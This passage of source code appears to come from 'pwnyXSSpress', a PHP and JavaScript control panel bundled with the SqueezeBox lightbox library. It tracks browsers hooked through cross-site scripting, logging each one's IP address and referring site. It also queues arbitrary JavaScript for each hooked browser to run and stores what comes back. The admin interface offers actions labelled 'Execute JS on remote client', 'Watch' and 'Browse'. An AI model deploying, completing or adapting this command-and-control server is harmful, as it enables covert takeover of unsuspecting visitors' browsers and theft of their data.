		this.closeBtn = new Element('a', {id: 'sbox-btn-close', href: '#'}).inject(this.win);
		this.fx = {
			overlay: new Fx.Tween(this.overlay, $merge({
				property: 'opacity',
				onStart: Events.prototype.clearChain,
				duration: 250,
				link: 'cancel'
			}, this.options.overlayFx)).set(0),
			win: new Fx.Morph(this.win, $merge({
				onStart: Events.prototype.clearChain,
				unit: 'px',
				duration: 750,
				transition: Fx.Transitions.Quint.easeOut,
				link: 'cancel',
				unit: 'px'
			}, this.options.resizeFx)),
			content: new Fx.Tween(this.content, $merge({
				property: 'opacity',
				duration: 250,
				link: 'cancel'
			}, this.options.contentFx)).set(0)
		};
		$(this.doc.body).adopt(this.overlay, this.win);
	},

	assign: function(to, options) {
		return ($(to) || $$(to)).addEvent('click', function() {
			return !SqueezeBox.fromElement(this, options);
		});
	},

	open: function(subject, options) {
		this.initialize();

		if (this.element != null) this.trash();
		this.element = $(subject) || false;

		this.setOptions($merge(this.presets, options || {}));

		if (this.element && this.options.parse) {
			var obj = this.element.getProperty(this.options.parse);
			if (obj && (obj = JSON.decode(obj, this.options.parseSecure))) this.setOptions(obj);
		}
		this.url = ((this.element) ? (this.element.get('href')) : subject) || this.options.url || '';

		this.assignOptions();

		var handler = handler || this.options.handler;
		if (handler) return this.setContent(handler, this.parsers[handler].call(this, true));
		var ret = false;
		return this.parsers.some(function(parser, key) {
			var content = parser.call(this);
			if (content) {
				ret = this.setContent(key, content);
				return true;
			}
			return false;
		}, this);
	},

	fromElement: function(from, options) {
		return this.open(from, options);
	},

	assignOptions: function() {
		this.overlay.set('class', this.options.classOverlay);
		this.win.set('class', this.options.classWindow);
		if (Browser.Engine.trident4) this.win.addClass('sbox-window-ie6');
	},

	close: function(e) {
		var stoppable = ($type(e) == 'event');
		if (stoppable) e.stop();
		if (!this.isOpen || (stoppable && !$lambda(this.options.closable).call(this, e))) return this;
		this.fx.overlay.start(0).chain(this.toggleOverlay.bind(this));
		this.win.setStyle('display', 'none');
		this.fireEvent('onClose', [this.content]);
		this.trash();
		this.toggleListeners();
		this.isOpen = false;
		return this;
	},

	trash: function() {
		this.element = this.asset = null;
		this.content.empty();
		this.options = {};
		this.removeEvents().setOptions(this.presets).callChain();
	},

	onError: function() {
		this.asset = null;
		this.setContent('string', this.options.errorMsg || 'An error occurred');
	},

	setContent: function(handler, content) {
		if (!this.handlers[handler]) return false;
		this.content.className = 'sbox-content-' + handler;
		this.applyTimer = this.applyContent.delay(this.fx.overlay.options.duration, this, this.handlers[handler].call(this, content));
		if (this.overlay.retrieve('opacity')) return this;
		this.toggleOverlay(true);
		this.fx.overlay.start(this.options.overlayOpacity);
		return this.reposition();
	},

	applyContent: function(content, size) {
		if (!this.isOpen && !this.applyTimer) return;
		this.applyTimer = $clear(this.applyTimer);
		this.hideContent();
		if (!content) {
			this.toggleLoading(true);
		} else {
			if (this.isLoading) this.toggleLoading(false);
			this.fireEvent('onUpdate', [this.content], 20);
		}
		if (content) {
			if (['string', 'array'].contains($type(content))) this.content.set('html', content);
			else if (!this.content.hasChild(content)) this.content.adopt(content);
		}
		this.callChain();
		if (!this.isOpen) {
			this.toggleListeners(true);
			this.resize(size, true);
			this.isOpen = true;
			this.fireEvent('onOpen', [this.content]);
		} else {
			this.resize(size);
		}
	},

	resize: function(size, instantly) {
		this.showTimer = $clear(this.showTimer || null);
		var box = this.doc.getSize(), scroll = this.doc.getScroll();
		this.size = $merge((this.isLoading) ? this.options.sizeLoading : this.options.size, size);
		var to = {
			width: this.size.x,
			height: this.size.y,
			left: (scroll.x + (box.x - this.size.x - this.options.marginInner.x) / 2).toInt(),
			top: (scroll.y + (box.y - this.size.y - this.options.marginInner.y) / 2).toInt()
		};
		this.hideContent();
		if (!instantly) {
			this.fx.win.start(to).chain(this.showContent.bind(this));
		} else {
			this.win.setStyles(to).setStyle('display', '');
			this.showTimer = this.showContent.delay(50, this);
		}
		return this.reposition();
	},

	toggleListeners: function(state) {
		var fn = (state) ? 'addEvent' : 'removeEvent';
		this.closeBtn[fn]('click', this.bound.close);
		this.overlay[fn]('click', this.bound.close);
		this.doc[fn]('keydown', this.bound.key)[fn]('mousewheel', this.bound.scroll);
		this.doc.getWindow()[fn]('resize', this.bound.window)[fn]('scroll', this.bound.window);
	},

	toggleLoading: function(state) {
		this.isLoading = state;
		this.win[(state) ? 'addClass' : 'removeClass']('sbox-loading');
		if (state) this.fireEvent('onLoading', [this.win]);
	},

	toggleOverlay: function(state) {
		var full = this.doc.getSize().x;
		this.overlay.setStyle('display', (state) ? '' : 'none');
		this.doc.body[(state) ? 'addClass' : 'removeClass']('body-overlayed');
		if (state) {
			this.scrollOffset = this.doc.getWindow().getSize().x - full;
			this.doc.body.setStyle('margin-right', this.scrollOffset);
		} else {
			this.doc.body.setStyle('margin-right', '');
		}
	},

	showContent: function() {
		if (this.content.get('opacity')) this.fireEvent('onShow', [this.win]);
		this.fx.content.start(1);
	},

	hideContent: function() {
		if (!this.content.get('opacity')) this.fireEvent('onHide', [this.win]);
		this.fx.content.cancel().set(0);
	},

	onKey: function(e) {
		switch (e.key) {
			case 'esc': this.close(e);
			case 'up': case 'down': return false;
		}
	},

	checkTarget: function(e) {
		return this.content.hasChild(e.target);
	},

	reposition: function() {
		var size = this.doc.getSize(), scroll = this.doc.getScroll(), ssize = this.doc.getScrollSize();
		this.overlay.setStyles({
			width: ssize.x + 'px',
			height: ssize.y + 'px'
		});
		this.win.setStyles({
			left: (scroll.x + (size.x - this.win.offsetWidth) / 2 - this.scrollOffset).toInt() + 'px',
			top: (scroll.y + (size.y - this.win.offsetHeight) / 2).toInt() + 'px'
		});
		return this.fireEvent('onMove', [this.overlay, this.win]);
	},

	removeEvents: function(type){
		if (!this.$events) return this;
		if (!type) this.$events = null;
		else if (this.$events[type]) this.$events[type] = null;
		return this;
	},

	extend: function(properties) {
		return $extend(this, properties);
	},

	handlers: new Hash(),

	parsers: new Hash()

};

SqueezeBox.extend(new Events($empty)).extend(new Options($empty)).extend(new Chain($empty));

SqueezeBox.parsers.extend({

	image: function(preset) {
		return (preset || (/\.(?:jpg|png|gif)$/i).test(this.url)) ? this.url : false;
	},

	clone: function(preset) {
		if ($(this.options.target)) return $(this.options.target);
		if (this.element && !this.element.parentNode) return this.element;
		var bits = this.url.match(/#([\w-]+)$/);
		return (bits) ? $(bits[1]) : (preset ? this.element : false);
	},

	ajax: function(preset) {
		return (preset || (this.url && !(/^(?:javascript|#)/i).test(this.url))) ? this.url : false;
	},

	iframe: function(preset) {
		return (preset || this.url) ? this.url : false;
	},

	string: function(preset) {
		return true;
	}
});

SqueezeBox.handlers.extend({

	image: function(url) {
		var size, tmp = new Image();
		this.asset = null;
		tmp.onload = tmp.onabort = tmp.onerror = (function() {
			tmp.onload = tmp.onabort = tmp.onerror = null;
			if (!tmp.width) {
				this.onError.delay(10, this);
				return;
			}
			var box = this.doc.getSize();
			box.x -= this.options.marginImage.x;
			box.y -= this.options.marginImage.y;
			size = {x: tmp.width, y: tmp.height};
			for (var i = 2; i--;) {
				if (size.x > box.x) {
					size.y *= box.x / size.x;
					size.x = box.x;
				} else if (size.y > box.y) {
					size.x *= box.y / size.y;
					size.y = box.y;
				}
			}
			size.x = size.x.toInt();
			size.y = size.y.toInt();
			this.asset = $(tmp);
			tmp = null;
			this.asset.width = size.x;
			this.asset.height = size.y;
			this.applyContent(this.asset, size);
		}).bind(this);
		tmp.src = url;
		if (tmp && tmp.onload && tmp.complete) tmp.onload();
		return (this.asset) ? [this.asset, size] : null;
	},

	clone: function(el) {
		if (el) return el.clone();
		return this.onError();
	},

	adopt: function(el) {
		if (el) return el;
		return this.onError();
	},

	ajax: function(url) {
		var options = this.options.ajaxOptions || {};
		this.asset = new Request.HTML($merge({
			method: 'get',
			evalScripts: false
		}, this.options.ajaxOptions)).addEvents({
			onSuccess: function(resp) {
				this.applyContent(resp);
				if (options.evalScripts !== null && !options.evalScripts) $exec(this.asset.response.javascript);
				this.fireEvent('onAjax', [resp, this.asset]);
				this.asset = null;
			}.bind(this),
			onFailure: this.onError.bind(this)
		});
		this.asset.send.delay(10, this.asset, [{url: url}]);
	},

	iframe: function(url) {
		this.asset = new Element('iframe', $merge({
			src: url,
			frameBorder: 0,
			width: this.options.size.x,
			height: this.options.size.y
		}, this.options.iframeOptions));
		if (this.options.iframePreload) {
			this.asset.addEvent('load', function() {
				this.applyContent(this.asset.setStyle('display', ''));
			}.bind(this));
			this.asset.setStyle('display', 'none').inject(this.content);
			return false;
		}
		return this.asset;
	},

	string: function(str) {
		return str;
	}

});

SqueezeBox.handlers.url = SqueezeBox.handlers.ajax;
SqueezeBox.parsers.url = SqueezeBox.parsers.ajax;
SqueezeBox.parsers.adopt = SqueezeBox.parsers.clone;

var pwnyServer = {

	client: {
		icons: [
			{
				'class': 'icons console',
				title: 'Execute JS on remote client',
				href: '?mode=cmd_queue&client_id={rowid}',
				'data-client_id': '{rowid}',
				events: {
					click: function(e){
						e.stop();
						pwnyServer.getCmdQueue( this.getAttribute('data-client_id'))

						/*
						//this screwed up the row styling
						var tr = this.parentNode.parentNode;
						if(!tr.nextSibling.hasAttribute('data-js-console')){
							var newEl = new Element('tbody', {'data-js-console': 'true'}).inject(tr, 'after');
							var newTr = new Element('tr').inject(newEl);
							var td = new Element('td', {colspan: tr.childNodes.length, 'id':'js_console' + this.getAttribute('data-client_id')}).inject(newTr);


							tr.jsConsoleSlide = new Fx.Slide(newEl);
							tr.jsConsoleSlide.hide();
						}
						console.log(tr.jsConsoleSlide)
						tr.jsConsoleSlide.toggle();
						*/
					}
				}
			},

			{
				'class': 'icons eye',
				title: 'Watch the remote client',
				href: '?mode=watch&client_id={rowid}',
				events: {
					click: function(e){
						e.stop();
						SqueezeBox.open(this.href, {
							handler: 'iframe',
							size: {x: 760, y: 420}
						});
					}
				}
			},

			{
				'class': 'icons monitor',
				title: 'Browser remote clients current site',
				href: '?mode=browse&client_id={rowid}',
				events: {
					click: function(e){
						e.stop();
						SqueezeBox.open(this.href, {
							handler: 'iframe',
							size: {x: 760, y: 420}
						});
					}
				}
			}
		],
		columns: {
			"rowid":"Client ID",
			"remote_addr":"IP Address",
			"site":"Site",
			"uri":"URI",
			"last_seen":"Last Seen"
		}
	},

	cmdQueue: {
		icons: [],

		columns: {
			"rowid":"CMD ID",
			"code":"Code",
			"sent":"Sent",
			"received":"Received",
			"errored":"Errors",
			"response":"Response"
		}

	},

	getCmdQueue: function (client_id){

		var request = new Request.JSON({
			url: '?mode=cmd_queue&client_id='+client_id,
			method: 'get',
			onComplete: function(jsonObj) {
				pwnyServer.addCmds(jsonObj);
			}
		}).send();
	},

	addCmds: function (objs){

		var columns = pwnyServer.cmdQueue.columns;
		var icons   = pwnyServer.cmdQueue.icons;
		var table	= new Element('table', {'class': 'pretty-table'}).inject('page-content');

		var tr = new Element('tr').inject(table);
		// icons head
		new Element('th', {'html': '-'}).inject(tr);
		for(i in pwnyServer.cmdQueue.columns){
			 new Element('th', {'html': pwnyServer.cmdQueue.columns[i]}).inject(tr);
		}



		try{
			var vals;
			objs.each(function (obj){
				var el = new Element('tr').inject(table);

				// icons
				var tmp = new Element('td').inject(el);

				for(i=0; i<icons.length; i++){
					vals = eval(uneval(icons[i]));
					for(v in vals){
						for(n in obj){
							if(vals[v].replace){
								vals[v] = vals[v].replace('{'+n+'}', obj[n]);
							}
						}
					}
					new Element('a', vals).inject(tmp);
				}

				for(i in columns){
					 new Element('td', {'html': obj[i]}).inject(el);
				}

			});
			vals = null;
		} catch(e){
			console.log(e);
		}

	},


	refreshClients: function (){

		var request = new Request.JSON({
			url: '?mode=list_clients',
			method: 'get',
			onComplete: function(jsonObj) {
				pwnyServer.addClients(jsonObj.clients);
			}
		}).send();
	},

	addClients: function (clients){

		var table = $('clients-table');
		table.empty();
		var el = new Element('thead').inject(table);
		el = new Element('tr').inject(el);
		// icons head
		new Element('th', {'html': '-'}).inject(el);
		for(i in pwnyServer.client.columns){
			 new Element('th', {'html': pwnyServer.client.columns[i]}).inject(el);
		}


		try{
			var vals;
			clients.each(function (client){

				var table = $('clients-table');
				var el = new Element('tr').inject(table);



				// icons
				var tmp = new Element('td').inject(el);
				for(i=0; i<pwnyServer.client.icons.length; i++){
					vals = eval(uneval(pwnyServer.client.icons[i]));
					for(v in vals){
						for(n in client.info){
							if(vals[v].replace){
								vals[v] = vals[v].replace('{'+n+'}', client.info[n]);
							}
						}
					}
					new Element('a', vals).inject(tmp);
				}

				for(i in pwnyServer.client.columns){
					 new Element('td', {'html': client.info[i]}).inject(el);
				}

			});
			vals = null;
		} catch(e){
			console.log(e);
		}
		//clients.each(function (el){console.log(e)})
	}

}

window.addEvent('domready', function(){
	pwnyServer.refreshClients();

	SqueezeBox.initialize({
        size: {x: 500, y: 400}
    });

 /*
	SqueezeBox.open($('demo-target-adopt'), {
		handler: 'adopt',
		size: {x: 300, y: 200}
	});
	SqueezeBox.assign($$('a[rel=boxed][href^=#]'), {
		size: {x: 200, y: 200}
	});
	*/

})
    </script>
  </head>
  <body>
  	<div id="page-container">
  		<div id="page-header">
  			pwnyXSSpress
  		</div>
  		<div id="page-content">
			<table id="clients-table" class="pretty-table"></table>
  		</div>
  		<div id="page-footer">
  		</div>
  	</div>

  </body>
</html><?php

			break;
		case 'list_clients':
			$clients = client::get();

			// need to set active
			foreach($clients as $i => $client){
				$client->getData();
				$client->info['active'] = (time() - strtotime($client->info['last_seen'])) < 900 ? 1: 0;
			}

			header('Content-type: text/json');
			print json_encode(array('clients' => $clients));
			break;
		case 'cmd_queue':
			$client_id = isset($_REQUEST['client_id']) ? preg_replace("/[^0-9]/", '', $_REQUEST['client_id']) : false;
			$client = new client($client_id);

			header('Content-type: text/json');
			$cmds = $client->getCmdQueue();
			print json_encode($cmds);


			break;
		case 'watch':
			$client_id = isset($_REQUESST['client_id']) ? preg_replace("/[^0-9]/", '', $_REQUESST['client_id']) : false;
			$client = new client($client_id);

			print "watching";
			break;
		case 'browse':
			$client_id = isset($_REQUESST['client_id']) ? preg_replace("/[^0-9]/", '', $_REQUESST['client_id']) : false;
			$client = new client($client_id);
			print "browsing";

			break;


	}


	exit;
}


if(isset($_SESSION['pwnyXSSpress']) == false ){
	$user = $_SERVER['REMOTE_ADDR'];
	if(is_dir(dirname(__FILE__).'/data/') === false){
		mkdir(dirname(__FILE__).'/data/');
	}

	if(is_dir(dirname(__FILE__).'/data/'.$user) === false){
		mkdir(dirname(__FILE__).'/data/'.$user);
	}

	$client = new client;
	$client->update();

	$_SESSION['pwnyXSSpress'] = array(
		'remote_addr' => $_SERVER['REMOTE_ADDR'],
		'client_id'	=> $client->id
	);
} else {
	$client = new client($_SESSION['pwnyXSSpress']['client_id']);
	$client->update();
}



switch($_SERVER['REQUEST_METHOD']){
	case 'POST':
		// the remote client is sending us data
		if(isset($_POST['cmdID'])){
			$data = array(
				':rowid' => $_POST['cmdID'],
				':errored' => isset($POST['error']),
				':received' => true,
				':response' => serialize($_POST)
			);

			$client->setCmdResponse($data);
		}

		print "<pre>";
		var_dump($_POST);
		print "</pre>";
		break;
	case 'GET':
		// the client is requesting commands
		$res = $client->getNextCmd();

		print "//{$client->id}\n\n";
		if($res){
			print "try {\n";
			print "\tpwny.startCmd({$res['rowid']});\n";
			print "\t{$res['code']}\n";
			print "\tpwny.finishCmd();\n";
			print "} catch(e){\n\tpwny.error(e);\n}\n\n";
		}

		$client->setCmdSent($res['rowid']);
		break;
}




class client {
	/**
	 * @var PDO $dbh
	 */
	private $dbh;
	public $info;
	public static function get(){
		global $dbh;
		$sql = "SELECT rowid FROM clients ORDER BY last_seen DESC";
		$stmt = $dbh->prepare($sql);
		$stmt->execute();
		$return = array();
		$res = $stmt->fetchAll(PDO::FETCH_ASSOC);

		foreach($res as $c){
			$return[] = new client($c['rowid']);
		}

		unset($res);
		return $return;
	}

	public function __construct($id=false){
		$this->id = $id;
		$this->dbh = $GLOBALS['dbh'];
	}

	public function getData(){
		if(!$this->info){
			$sql = "SELECT rowid, * FROM clients WHERE rowid=:client_id";
			$stmt = $this->dbh->prepare($sql);
			$stmt->execute(array(':client_id' => $this->id));
			$this->info = $stmt->fetch(PDO::FETCH_ASSOC);
		}
		return $this->info;
	}

	public function update(){
		if($this->id === false){
			$add_client = "INSERT INTO clients (remote_addr, site, uri, last_seen) VALUES(:remote_addr, :site, :uri, DATETIME('NOW', 'localtime'))";
			$stmt = $this->dbh->prepare($add_client);

			if(isset($_SERVER['HTTP_REFERER'])){
				$url = parse_url($_SERVER['HTTP_REFERER']);
			} else {
				$url = array('host' => '', 'path' => '');
			}

			$stmt->execute(array(
				':remote_addr' => $_SERVER['REMOTE_ADDR'],
				':site' => $url['host'],
				':uri' => $url['path']
			));

			$this->id = $this->dbh->lastInsertId();

		} else {
			$update_client = "UPDATE clients SET site=:site, uri=:uri, last_seen=DATETIME('NOW') WHERE rowid=:client_id";
			$stmt = $this->dbh->prepare($update_client);

			if(isset($_SERVER['HTTP_REFERER'])){
				$url = parse_url($_SERVER['HTTP_REFERER']);
			} else {
				$url = array('host' => '', 'path' => '');
			}

			$stmt->execute(array(
				':site' => $url['host'],
				':uri' => $url['path']
			));
		}
	}

	public function getCmdQueue(){
		$cmd_sql = "SELECT rowid, * FROM cmd_queue WHERE client_id=:client_id ORDER BY sent, received, errored";
		$stmt = $this->dbh->prepare($cmd_sql);
		$stmt->execute(array(':client_id' => $this->id));

		return $stmt->fetchAll(PDO::FETCH_ASSOC);
	}

	public function addCmd($cmd){
		$cmd_sql = "INSERT INTO cmd_queue (client_id, cmd) VALUES (:client_id, :cmd)";
		$stmt = $this->dbh->prepare($cmd_sql);
		$stmt->execute(array(':client_id' => $this->id, ':cmd' => $cmd));
	}

	public function getNextCmd(){
		$cmd_sql = "SELECT rowid, * FROM cmd_queue WHERE client_id=:client_id AND sent=0 ORDER BY rowid ASC LIMIT 1";
		$stmt = $this->dbh->prepare($cmd_sql);
		$stmt->execute(array(':client_id' => $this->id));

		return $stmt->fetch(PDO::FETCH_ASSOC);
	}

	public function setCmdSent($id){
		$cmd_sql = "UPDATE cmd_queue SET sent=1 WHERE rowid=:rowid";
		$stmt = $this->dbh->prepare($cmd_sql);
		$stmt->execute(array(':rowid' => $id));
	}

	public function setCmdResponse($data){

		$up = "UPDATE cmd_queue SET errored=:errored, received=:received, response=:response WHERE rowid=:rowid";
		$stmt = $this->dbh->prepare($up);
		$stmt->execute($data);
	}
}




